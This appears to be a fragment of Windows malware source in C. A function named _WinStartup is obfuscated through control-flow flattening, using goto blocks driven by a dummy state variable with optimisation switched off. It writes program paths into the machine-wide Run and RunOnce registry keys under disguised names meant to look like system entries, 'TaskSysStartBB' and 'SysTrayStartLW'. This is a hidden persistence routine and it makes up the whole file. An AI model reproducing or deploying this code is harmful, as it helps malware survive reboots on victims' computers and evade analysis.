#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>

void _WinStartup(void)
{
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 5) goto block5;
    if (dummy_state == 6) goto block6;
    if (dummy_state == 7) goto block7;
    if (dummy_state == 8) goto block8;
    if (dummy_state == 0) goto end;

block1:
    // Copy windoze to winreg and ensure null-termination
    strcpy(_winreg, _windoze);
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    RegCreateKeyA((HKEY)0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &_hKey);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    RegSetValueExA(_hKey, "TaskSysStartBB", 0, REG_SZ, (const BYTE*)_winreg, sizeof(_winreg));
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    RegCloseKey(_hKey);
    dummy_state = 5;
    goto dummy_dispatcher;

block5:
    // Copy sysdoze to sysreg and ensure null-termination
    strcpy(_sysreg, _sysdoze);
    dummy_state = 6;
    goto dummy_dispatcher;

block6:
    RegCreateKeyA((HKEY)0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &_hKey);
    dummy_state = 7;
    goto dummy_dispatcher;

block7:
    RegSetValueExA(_hKey, "SysTrayStartLW", 0, REG_SZ, (const BYTE*)_sysreg, sizeof(_sysreg));
    dummy_state = 8;
    goto dummy_dispatcher;

block8:
    RegCloseKey(_hKey);
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
